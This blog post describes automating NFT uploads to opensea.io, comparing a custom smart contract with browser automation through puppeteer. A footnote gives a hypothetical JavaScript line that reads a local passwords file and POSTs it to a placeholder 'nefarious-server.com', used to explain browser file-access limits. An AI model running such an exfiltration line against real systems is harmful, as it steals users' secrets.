---
title: Automating NFT uploads to opensea.io
date: 09-10-2021
katex: false
tags: nft, crypto
---

# Automating NFT uploads to opensea.io

## The problem

[opensea](https://opensea.io) allows you to create collections of NFTs, but you
can only add one item to the collection at a time via their 'add item' form /
web UI. This is fine if you are only creating a few NFTs, but quickly becomes
laborious if you want to create a large collection.

This seems to be a common issue, [see here](https://reddit.com/m6v5vr) for
example.

## Solution 1

One approach is to avoid the 'add item' UI completely by making your own smart
contract, and then integrating that contract with opensea ([details
here](https://docs.opensea.io/docs/opensea-integration)). The downside with
this approach is that you have to pay gas fees to create the contract.

## Solution 2

It would be nicer (compared with [Solution 1](solution-1)) to automate the 'add
item' UI, because this is a free operation (as in beer). The flow is basically:

a) upload artwork / digital asset
b) fill in metadata
c) submit.

It is theoretically possible to perform this flow by just sending http(s)
requests (e.g. in a python script), but in practice it would be difficult
because it is first necessary to authenticate with opensea, and the also to
connect to your wallet. This sort of auth flow is more easily done in a browser,
_but_ by doing the automation in the browser, uploading the artwork becomes
harder. Without a user prompt or action, it is not possible to read local files
with JS in a browser environment[^1], so we cannot simply hack up a JS script to
run in the browser console. You can however get around this by automating user
actions (e.g. using puppeteer).

See [this script](./upload.js.txt) which I used to add several items to the [64
angel mice collection](https://opensea.io/collection/64-angel-mice) (run it with
`node upload.js`, having modified the relevant constants). The script
gives you a chance to authenticate + connect to your wallet, and then for each
item you wish to upload, it'll open a new tab, and submit an associated form. In
practice, I found that the form submissions to opensea failed occasionally, and
this required manual intervention. If you wanted to add thousands of items,
you'd probably want to improve the script to retry any failed form submissions.

[^1]: If it were possible, then I suspect something like this would be a
remarkably successful attack: `const secret = await fetch("file:///home/ben/passwords"); await fetch("https://nefarious-server.com", {method:"POST", body:secret})`.